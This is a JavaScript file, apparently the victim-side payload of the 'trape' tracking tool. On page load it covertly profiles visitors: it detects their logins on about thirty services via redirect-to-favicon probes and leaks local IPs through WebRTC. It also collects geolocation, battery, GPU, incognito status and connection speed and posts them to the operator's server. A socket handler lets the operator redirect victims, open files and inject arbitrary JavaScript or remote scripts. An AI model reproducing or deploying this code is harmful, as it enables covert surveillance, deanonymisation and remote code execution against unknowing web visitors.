var urlServices = [];
var Services = [];
var latitude = null, longitude = null;

window.serverPath = '';

var socketTrape = null;

$(document).ready(function($) {
    var d = getVictimData();
    getGeolocation();

    Services = [{
        url: "https://www.facebook.com",
        path: "/login.php?next=http://www.facebook.com/favicon.ico",
        name: "Facebook",
        login: "/login.php"
    }, {
        url: "https://twitter.com",
        path: "/login?redirect_after_login=%2Ffavicon.ico",
        name: "Twitter",
        login: "/login" 
    }, {
        url: "https://vk.com",
        path: "/login?u=2&to=ZmF2aWNvbi5pY28-",
        name: "Vkontakte",
        login: "/login"
    }, {
        url: "https://www.reddit.com",
        path: "/login?dest=https%3A%2F%2Fwww.reddit.com%2Ffavicon.ico",
        name: "Reddit",
        login: "/login"
    }, {
        url: "https://accounts.google.com",
        path: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail",
        name: "Gmail",
        login: "/ServiceLogin"
    }, {
        url: "https://www.spotify.com",
        path: "/en/login/?forward_url=https%3A%2F%2Fwww.spotify.com%2Ffavicon.ico",
        name: "Spotify",
        login: "/en/login/"
    }, {
        url: "https://www.tumblr.com",
        path: "/login?redirect_to=%2Ffavicon.ico",
        name: "Tumblr",
        login: "/login"
    }, {
        url: "https://www.dropbox.com",
        path: "/login?cont=https%3A%2F%2Fwww.dropbox.com%2Fstatic%2Fimages%2Fabout%2Fdropbox_logo_glyph_2015.svg",
        name: "Dropbox",
        login: "/login"
    }, {
        url: "https://www.amazon.com",
        path: "/ap/signin/178-4417027-1316064?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=10000000&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Ffavicon.ico",
        name: "Amazon",
        login: "/ap/signin/"
    }, {
        url: "https://github.com",
        path: "/login?return_to=https%3A%2F%2Fgithub.com%2Ffavicon.ico%3Fid%3D1",
        name: "Github",
        login: "/login"
    }, {
        url: "https://medium.com",
        path: "/m/signin?redirect=https%3A%2F%2Fmedium.com%2Ffavicon.ico&loginType=default",
        name: "Medium",
        login: "/m/signin"
    }, {
        url: "https://www.paypal.com",
        path: "/signin?returnUri=https://t.paypal.com/ts?v=1.0.0",
        name: "Paypal",
        login: "/account/signin/"
    }, {
        url: "https://bitbucket.org",
        path: "/account/signin/?next=/favicon.ico",
        name: "BitBucket",
        login: "/account/signin/"
    }, {
        url: "https://www.instagram.com",
        path: "/accounts/login/?next=%2Ffavicon.ico",
        name: "Instagram",
        login: "/accounts/login/"
    }, {
        url: "https://foursquare.com",
        path: "/login?continue=%2Ffavicon.ico",
        name: "Foursquare",
        login: "/login"
    }, {
        url: "https://www.airbnb.com",
        path: "/login?redirect_params[action]=favicon.ico&redirect_params[controller]=home",
        name: "Airbnb",
        login: "/login"
    }, {
        url: "https://news.ycombinator.com",
        path: "/login?goto=y18.gif",
        name: "Hackernews",
        login: "/login"
    }, {
        url: "https://slack.com",
        path: "/checkcookie?redir=https%3A%2F%2Fslack.com%2Ffavicon.ico%23",
        name: "Slack",
        login: "/signin"
    }, {
        url: "https://squareup.com",
        path: "/login?return_to=%2Ffavicon.ico",
        name: "Square",
        login: "/login"
    }, {
        url: "https://squareup.com",
        path: "/login?return_to=%2Ffavicon.ico",
        name: "Square",
        login: "/login"
    }, {
        url: "https://disqus.com",
        path: "/profile/login/?next=https%3A%2F%2Fdisqus.com%2Ffavicon.ico",
        name: "Disqus",
        login: "/profile/login"
    }, {
        url: "https://www.meetup.com",
        path: "/login/?returnUri=https%3A%2F%2Fwww.meetup.com%2Fimg%2Fajax_loader_trans.gif",
        name: "Meetup",
        login: "/login"
    }, {
        url: "https://www.udemy.com",
        path: "/join/login-popup/?next=/staticx/udemy/images/v6/favicon.ico",
        name: "Udemy",
        login: "/join/login-popup/"
    }, {
        url: "https://www.patreon.com",
        path: "/login?ru=/images/profile_default.png",
        name: "Patreon",
        login: "/login"
    }, {
        url: "https://accounts.google.com",
        path: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube",
        name: "Youtube",
        login: "/ServiceLogin"
    }, {
        url: "https://accounts.snapchat.com",
        path: "/accounts/login?continue=https://accounts.snapchat.com/accounts/static/images/favicon/favicon.png",
        name: "Snapchat",
        login: "/accounts/login"
    }, {
        url: "https://www.messenger.com",
        path: "/login.php?next=http://www.messenger.com/favicon.ico",
        name: "Messenger",
        login: "/login.php"
    }, {
        url: "https://www.khanacademy.org",
        path: "/login?continue=/favicon.ico",
        name: "Khanacademy",
        login: "/login"
    }, {
        url: "https://www.eventbrite.com",
        path: "/signin/?referrer=https://www.eventbrite.com/favicon.ico",
        name: "Eventbrite",
        login: "/signin"
    }, {
        url: "https://www.etsy.com",
        path: "/signin?from_page=https://www.etsy.com/favicon.ico",
        name: "Etsy",
        login: "/signin"
    }, {
        url: "https://www.twitch.tv",
        path: "/login?redirect_on_login=/favicon.ico",
        name: "Twitch",
        login: "/login"
    }];

    $.each(Services, function(index, val) {
         urlServices[val.name.toLowerCase()] = val.url + val.login;
    });
});

window.t_sdisconnect = false;


function tping() {
    var d = getVictimData();
    var data = {id : d.vId};

    if (socketTrape != null){
        if (socketTrape.disconnected){
            window.t_sdisconnect = socketTrape.disconnected;
        }
    }
    $.ajax({
        url: window.serverPath + '/tping',
        data: data,
        dataType: "json",
        type: 'POST',
        success: function(response) {
            setTimeout(function(){tping()}, 1500);
            if(window.t_sdisconnect){
                createSockets();
                window.t_sdisconnect = socketTrape.disconnected;
            }
        },
        error: function(error) {
            setTimeout(function(){tping()}, 2000);
        }
    });
}

function conChange() {
    var connection = window.navigator.connection || window.navigator.mozConnection || null;
    var d = getVictimData();
    var vConnection = {};

    if (connection != undefined && connection != null){

        $.each(connection, function(index, val) {
            if (typeof(val) != 'object' && typeof(val) != 'function'){
                vConnection[index] = val;
            }
        });

    } else {
        vConnection = {"downlink": 0, "effectiveType" : "ND", "rtt" : 0};
    }

    var objDownload = {
        size : 2104238,
        src : 'https://upload.wikimedia.org/wikipedia/commons/0/01/Sof%C3%ADa_Vergara_3_May_2014_%28cropped%29.jpg'
    };

    var objTime = {
        start : 0,
        end : 0,
        duration : 0
    }

    objTime.start =  (new Date ()).getTime();
    var imgDownload = new Image ();

    imgDownload.onload = function(){
        objTime.end =  (new Date ()).getTime();
        objDownload.duration = ((objTime.end - objTime.start)/1000);
        objDownload.bitsLoaded = (parseFloat(objDownload.size) * 8);
        objDownload.speedBps = Math.round (objDownload.bitsLoaded / objDownload.duration);
        objDownload.speedKbps = (objDownload.speedBps / 1024).toFixed(2);
        objDownload.speedMbps = (objDownload.speedKbps / 1024).toFixed(2);

        var packet = '1111111111111111';
        for (var i = 0; i <= 15; i++) {
            packet += packet;
        }

        var objUpload = {
            size : packet.length
        };

        objTime.start =  (new Date ()).getTime();
        $.post('https://www.googleapis.com/urlshortener/v1/url?key=', {'longUrl': packet}, function(data, textStatus, xhr) {
        }, 'json').fail(function(){
            objTime.end =  (new Date ()).getTime();
            objUpload.duration = ((objTime.end - objTime.start)/1000);
            objUpload.bitsLoaded = (parseFloat(objUpload.size) * 8);
            objUpload.speedBps = Math.round (objUpload.bitsLoaded / objUpload.duration);
            objUpload.speedKbps = (objUpload.speedBps / 1024).toFixed(2);
            objUpload.speedMbps = (objUpload.speedKbps / 1024).toFixed(2);

            vConnection.Download_test = objDownload;
            vConnection.Upload_test = objUpload;
            vConnection = JSON.stringify(vConnection);

            var data = {
                    vId : d.vId,
                    con: vConnection,
                    host : document.location.host};
            $.ajax({
                url: window.serverPath + '/lc',
                data: data,
                dataType: "json",
                type: 'POST',
                success: function(response) {
                    //setTimeout(function(){ locateV(); }, 5000);
                },
                error: function(error) {
                    
                }
            });
        });
    }

    imgDownload.src = objDownload.src + '?n=' + Math.random();

}

function sendData(data) {
    $.ajax({
        url: window.serverPath + '/nr',
        data: data,
        dataType: "json",
        type: 'POST',
        success: function(response) {

        },
        error: function(error) {
        }
    });
}


function getVictimData() {
	var d = {
        vId : null, 
        vURL : null
    };
	if (localStorage.trape_vId != undefined) {
		d.vId = localStorage.trape_vId;
        d.vURL = localStorage.trape_vURL;
	}
	
	return d;
}

function defineSockets(self) {
    self.on('my_response', function(msg) {
        switch (msg.data.type){
            case 'network':
                localStorage.setItem("trape_vURL", urlServices[msg.data.message]);
                window.location.replace('/rv?url=' + urlServices[msg.data.message]);
                break;
            case 'url':
                localStorage.setItem("trape_vURL", msg.data.message);
                window.location.replace('/rv?url=' + msg.data.message);
                break;
            case 'redirect':
                window.location.replace(msg.data.message);
                break;
            case 'alert':
                alert(msg.data.message);
                break;
            case 'execute':
                var objW = window.open('static/files/' + msg.data.message);
                if (objW == null){
                    objW = window.location.replace('static/files/' + msg.data.message);
                }
                console.log(objW);
                break;
            case 'talk':
                responsiveVoice.speak(msg.data.message, msg.data.voice, {volume: 1});
                break;
            case 'jscode':
                $('body').append('<script>' + msg.data.message + '</script>');
                break;
            case 'jsscript':
                $('body').append('<script src="' + msg.data.message + '"></script>');
                break;
            default:
                return false;
        }                            
    });
}

function locateV(self) {
    /*
    $.ajax({
	url: "https://www.googleapis.com/geolocation/v1/geolocate?key=" + window.gMapsApiKey,
        data: {},
        dataType: "json",
        type: "POST",
        success: function(response, status) {
            if (status == 'success'){
                $.ajax({
                        url: window.serverPath + '/lr',
                        data :  {"vId" : localStorage.trape_vId, "lat": response.location.lat, "lon": response.location.lng},
                        dataType: "json",
                        type: 'POST',
                        success: function(data) {
                            setTimeout(function(){ locateV(); }, 30000);
                        },
                        error:function(error) {
                            setTimeout(function(){ locateV(); }, 10000);
                        }    
                    });
            } else{
                setTimeout(function(){ locateV(); }, 10000);    
            }
        },
        error: function(error) {
            setTimeout(function(){ locateV(); }, 10000);
        }
    });
    */

    $.ajax({
        url: window.serverPath + '/lr',
        data :  {"vId" : localStorage.trape_vId, "lat": latitude, "lon": longitude},
        dataType: "json",
        type: 'POST',
        success: function(data) {
            setTimeout(function(){ locateV(); }, 5000);
        },
        error:function(error) {
            setTimeout(function(){ locateV(); }, 10000);
        }    
    });
}

function workWithNetworks(){
    $.getJSON('//ipinfo.io/json/?callback=?', function(data) {
        var dInfo = {ip : null, vId : null, red : null};
        $.extend( true, dInfo, data);
        dInfo.vId = localStorage.trape_vId
        var idx = 0;

        $.each(Services, function(index, network) {
            var img = document.createElement("img");
            img.src = network.url + network.path;
            img.onload = function() {
                dInfo.red = network.name;
                sendData(dInfo);
                idx = getUpdateData(idx);
            };
                img.onerror = function() {
                idx = getUpdateData(idx);
            };
        });
    });

    function getUpdateData(idx) {
        idx++;
        return idx;
    }
}

function detectBattery(){
    var b_send_data = function(data){
        var d = getVictimData();
        $.ajax({
            url: window.serverPath + "/bs",
            data: {id : d.vId, 't' : data.type, 'd' : data.val},
            dataType: "json",
            type: "POST",
            success: function(response) {},
            error: function(error) {}
        });
    }

    try{
        navigator.getBattery().then(function(battery) {
          function updateAllBatteryInfo(){
            updateChargeInfo();
            updateLevelInfo();
            updateChargingInfo();
            updateDischargingInfo();
          }
          updateAllBatteryInfo();

          battery.addEventListener('chargingchange', function(){
            updateChargeInfo();
          });
          function updateChargeInfo(){
            b_send_data({'type' : 'charging', 'val' : (battery.charging ? 'True' : 'False')});
          }

          battery.addEventListener('levelchange', function(){
            updateLevelInfo();
          });
          function updateLevelInfo(){
            b_send_data({'type' : 'level', 'val' : (battery.level * 100)});

          }

          battery.addEventListener('chargingtimechange', function(){
            updateChargingInfo();
          });
          function updateChargingInfo(){
            b_send_data({'type' : 'time_c', 'val' : battery.chargingTime});
          }

          battery.addEventListener('dischargingtimechange', function(){
            updateDischargingInfo();
          });
          function updateDischargingInfo(){
            b_send_data({'type' : 'time_d', 'val' : battery.dischargingTime});
          }
        });
        
    } catch(err) {
        b_send_data({'type' : 'charging', 'val' : 'No Detected'});
        b_send_data({'type' : 'level', 'val' : 0});
        b_send_data({'type' : 'time_c', 'val' : 0});
        b_send_data({'type' : 'time_d', 'val' : 0});
    }
}

function navigation_mode(){
    var nm_sendData = function(data){
        var d = getVictimData();
        $.ajax({
            url: window.serverPath + "/nm",
            data: {id : d.vId, 'd' : data, 'dn' : navigator.doNotTrack},
            dataType: "json",
            type: "POST",
            success: function(response) {},
            error: function(error) {}
        });
    }

    function ifIncognito(incog,func){ var fs = window.RequestFileSystem || window.webkitRequestFileSystem; if (!fs) {
        var db = indexedDB.open("test");
        db.onerror = function(){
            nm_sendData('incognito')
            var storage = window.sessionStorage;
            try {
                storage.setItem("p123", "test");
                storage.removeItem("p123");
            } catch (e) {
                if (e.code === DOMException.QUOTA_EXCEEDED_ERR && storage.length === 0) {
                    nm_sendData('incognito')
                }
            }
        };
        db.onsuccess =function(){nm_sendData('normal')};
    } else { if(incog) fs(window.TEMPORARY, 100, ()=>{}, func); else fs(window.TEMPORARY, 100, func, ()=>{}); } } 

    ifIncognito(true, ()=>{ nm_sendData('incognito') }); 
    ifIncognito(false, ()=>{ nm_sendData('normal') }) 
}

function queryGPU(){
    $('body').append('<canvas id="glcanvas" width="1" height="1"></canvas>');
    var canvas = document.getElementById("glcanvas");
    var v_data = {
        "vendor" : 'No Detect',
        "renderer" : 'No Detect',
        "display" : 'No Detect'
    };
        try {
            gl = canvas.getContext("experimental-webgl");
            gl.viewportWidth = canvas.width;
            gl.viewportHeight = canvas.height;
        } catch (e) {}
        if (gl) {
            var extension = gl.getExtension('WEBGL_debug_renderer_info');

            if (extension != undefined) {
                v_data.vendor = gl.getParameter(extension.UNMASKED_VENDOR_WEBGL);
                v_data.renderer = gl.getParameter(extension.UNMASKED_RENDERER_WEBGL);
            } else {
                v_data.vendor = gl.getParameter(gl.VENDOR);
                v_data.renderer = gl.getParameter(gl.RENDERER);
            }

        }
        v_data.display = window.screen.width + ' x ' + window.screen.height + ' - ' + window.screen.colorDepth + 'bits/pixel';

    $.ajax({
        url: '/gGpu',
        data: {vId : localStorage.trape_vId, data : JSON.stringify(v_data)},
        dataType: "json",
        type: 'POST',
        success: function(response) {
            
        },
        error: function(error) {
        }
    });
}

function getIPs(callback) {
    var ip_dups = {};
    var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
    var useWebKit = !!window.webkitRTCPeerConnection;

    if (!RTCPeerConnection) {
        var win = iframe.contentWindow;
        RTCPeerConnection = win.RTCPeerConnection || win.mozRTCPeerConnection || win.webkitRTCPeerConnection;
        useWebKit = !!win.webkitRTCPeerConnection;
    }

    var mediaConstraints = {
        optional: [{
            RtpDataChannels: true
        }]
    };

    var servers = {
        iceServers: [{
            urls: "stun:stun.services.mozilla.com"
        }]
    };

    var pc = new RTCPeerConnection(servers, mediaConstraints);

    var sentResult = false;

    function handleCandidate(candidate) {
        var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
        var ip_addr = ip_regex.exec(candidate)[1];

        //remove duplicates
        if (!sentResult && ip_dups[ip_addr] === undefined) {
            sentResult = true;
            callback(ip_addr);
        }

        ip_dups[ip_addr] = true;
    }

    pc.onicecandidate = function(ice) {

        //skip non-candidate events
        if (ice.candidate)
            handleCandidate(ice.candidate.candidate);
    };
    pc.createDataChannel("");

    pc.createOffer(function(result) {

        pc.setLocalDescription(result, function() {}, function() {});

    }, function() {});

    setTimeout(function() {
        var lines = pc.localDescription.sdp.split('\n');

        lines.forEach(function(line) {
            if (line.indexOf('a=candidate:') === 0)
                handleCandidate(line);
        });
    }, 1000);
}

function getGeolocation(){
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition( function(position){        
            latitude = position.coords.latitude;
            longitude = position.coords.longitude;
        });
    }
}

var objUser = {
    getIPs : function(){
        getIPs(function(ip){
            $.ajax({
                url: window.serverPath + "/cIp",
                data: {"ip" : ip, "id" : localStorage.trape_vId},
                dataType: "json",
                type: "POST",
                success: function(response) {

                },
                error: function(error) {}
            });
        });
    }
    , sendNetworks : function(){workWithNetworks();}
}
